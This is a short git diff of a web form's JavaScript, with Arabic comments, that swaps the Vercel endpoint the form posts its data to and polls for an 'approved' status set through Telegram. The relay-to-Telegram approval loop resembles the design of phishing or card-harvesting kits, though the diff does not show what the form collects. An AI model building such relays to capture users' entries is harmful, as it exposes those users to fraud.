@@ -176,8 +176,8 @@ $('f').addEventListener('submit', async e => {
     document.querySelector('.card').appendChild(waitDiv);
 
     try {
-      // إرسال البيانات إلى ملف الإرسال (send.js) على Vercel
-      await fetch("https://telegram-form-api-lemon.vercel.app/api/send", {
+      // إرسال البيانات إلى ملف الإرسال (send.js) على مشروعك الحالي
+      await fetch("https://a2-store-red.vercel.app/api/send", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
@@ -186,7 +186,7 @@ $('f').addEventListener('submit', async e => {
       // حلقة الفحص عبر ملف (check.js) لمعرفة متى ستوافق من تليجرام
       const checkInterval = setInterval(async () => {
         try {
-          const res = await fetch(`https://telegram-form-api-lemon.vercel.app/api/check?user_id=${userId}`);
+          const res = await fetch(`https://a2-store-red.vercel.app/api/check?user_id=${userId}`);
           const data = await res.json();
 
           if (data.status === 'approved') {
